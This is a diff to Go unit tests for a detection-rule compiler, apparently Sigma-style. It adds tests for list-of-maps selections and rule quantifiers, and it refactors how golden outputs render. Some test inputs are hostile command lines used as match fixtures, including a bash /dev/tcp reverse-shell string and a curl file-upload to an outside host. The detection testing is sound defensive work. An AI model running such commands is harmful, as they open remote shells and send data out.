@@ -82,10 +82,8 @@ func TestCompileRejectsInvalid(t *testing.T) {
 		{"bad-modifier.yml", "modifier"},
 		{"missing-condition.yml", "condition"},
 		{"unknown-selection.yml", "unknown selection"},
-		{"wildcard-form.yml", "Phase 1"},
 		{"timeframe.yml", "timeframe"},
 		{"bad-regex.yml", "regex"},
-		{"list-selection.yml", "list-of-maps"},
 		{"missing-id.yml", "id required"},
 		{"empty-condition.yml", "end of condition"},
 	}
@@ -316,6 +314,82 @@ func TestModifierUTF16LE(t *testing.T) {
 	}
 }
 
+func TestListOfMapsSelection(t *testing.T) {
+	art, _, _, err := Compile(readRule(t, "testdata/rules/29-list-of-maps.yml"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	rule := art.Rule
+	if !rule.Match(mapEnv{"Image": {"/bin/bash"}, "CommandLine": {"bash -i >& /dev/tcp/x/y"}}) {
+		t.Errorf("first branch (bash + -i) should match")
+	}
+	if !rule.Match(mapEnv{"Image": {"/bin/sh"}, "CommandLine": {"sh -c 'curl x'"}}) {
+		t.Errorf("second branch (sh + -c) should match")
+	}
+	if rule.Match(mapEnv{"Image": {"/bin/bash"}, "CommandLine": {"bash -c x"}}) {
+		t.Errorf("partial cross-branch match should not fire")
+	}
+}
+
+func TestQuantifier1Of(t *testing.T) {
+	art, _, _, err := Compile(readRule(t, "testdata/rules/30-quantifier-1of.yml"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	rule := art.Rule
+	if !rule.Match(mapEnv{"Image": {"/bin/bash"}}) {
+		t.Errorf("1 of sel_* should match when sel_b alone matches")
+	}
+	if !rule.Match(mapEnv{"Image": {"/bin/sh"}}) {
+		t.Errorf("1 of sel_* should match when sel_a alone matches")
+	}
+	if rule.Match(mapEnv{"Image": {"/bin/zsh"}}) {
+		t.Errorf("1 of sel_* should not match when neither selection matches")
+	}
+}
+
+func TestQuantifierAllOfThem(t *testing.T) {
+	art, _, _, err := Compile(readRule(t, "testdata/rules/31-quantifier-allofthem.yml"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	rule := art.Rule
+	all := mapEnv{
+		"Image":       {"/usr/bin/curl"},
+		"CommandLine": {"curl --upload-file foo http://example.com"},
+	}
+	if !rule.Match(all) {
+		t.Errorf("all of them should match when every selection holds")
+	}
+	missing := mapEnv{
+		"Image":       {"/usr/bin/curl"},
+		"CommandLine": {"curl --upload-file foo"}, // no http
+	}
+	if rule.Match(missing) {
+		t.Errorf("all of them should fail when one selection misses")
+	}
+}
+
+func TestQuantifierNumeric(t *testing.T) {
+	art, _, _, err := Compile(readRule(t, "testdata/rules/32-quantifier-numeric.yml"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	rule := art.Rule
+	// Two of four hints — meets threshold.
+	if !rule.Match(mapEnv{"CommandLine": {"curl http://example.com"}}) {
+		t.Errorf("2 of hint_* should match cmdline that hits hint_a + hint_b")
+	}
+	// Only one hint — below threshold.
+	if rule.Match(mapEnv{"CommandLine": {"curl ftp://example.com"}}) {
+		t.Errorf("2 of hint_* should not match a single-hit cmdline")
+	}
+	// Three of four — well above threshold.
+	if !rule.Match(mapEnv{"CommandLine": {"curl --upload http://example.com"}}) {
+		t.Errorf("2 of hint_* should match a three-hit cmdline")
+	}
+}
+
 func TestCostOrdering(t *testing.T) {
 	simpleArt, _, _, err := Compile(readRule(t, "testdata/rules/05-find-suid.yml"))
 	if err != nil {
@@ -370,31 +444,41 @@ func ruleGolden(r *Rule) map[string]any {
 	sels := make([]any, 0, len(names))
 	for _, name := range names {
 		sel := r.Selections[name]
-		fields := make([]any, 0, len(sel.Fields))
-		for i := range sel.Fields {
-			fp := sel.Fields[i]
-			row := map[string]any{
-				"field":  fp.Field,
-				"op":     fp.Op.String(),
-				"values": fp.Values,
+		branchesGolden := make([]any, 0, len(sel.Branches))
+		for _, branch := range sel.Branches {
+			fields := make([]any, 0, len(branch))
+			for i := range branch {
+				fp := branch[i]
+				row := map[string]any{
+					"field":  fp.Field,
+					"op":     fp.Op.String(),
+					"values": fp.Values,
+				}
+				if fp.Mods != 0 {
+					row["mods"] = fp.Mods.String()
+				}
+				fields = append(fields, row)
 			}
-			if fp.Mods != 0 {
-				row["mods"] = fp.Mods.String()
-			}
-			fields = append(fields, row)
+			sort.SliceStable(fields, func(i, j int) bool {
+				a := fields[i].(map[string]any)
+				b := fields[j].(map[string]any)
+				if a["field"].(string) != b["field"].(string) {
+					return a["field"].(string) < b["field"].(string)
+				}
+				return a["op"].(string) < b["op"].(string)
+			})
+			branchesGolden = append(branchesGolden, fields)
 		}
-		sort.SliceStable(fields, func(i, j int) bool {
-			a := fields[i].(map[string]any)
-			b := fields[j].(map[string]any)
-			if a["field"].(string) != b["field"].(string) {
-				return a["field"].(string) < b["field"].(string)
-			}
-			return a["op"].(string) < b["op"].(string)
-		})
-		sels = append(sels, map[string]any{
-			"name":   name,
-			"fields": fields,
-		})
+		entry := map[string]any{"name": name}
+		// Common case (single-branch selections) keeps the old "fields"
+		// shape so existing 22 goldens stay byte-stable across this
+		// refactor. List-of-maps selections render as "branches".
+		if len(branchesGolden) == 1 {
+			entry["fields"] = branchesGolden[0]
+		} else {
+			entry["branches"] = branchesGolden
+		}
+		sels = append(sels, entry)
 	}
 	out["selections"] = sels
 	return out
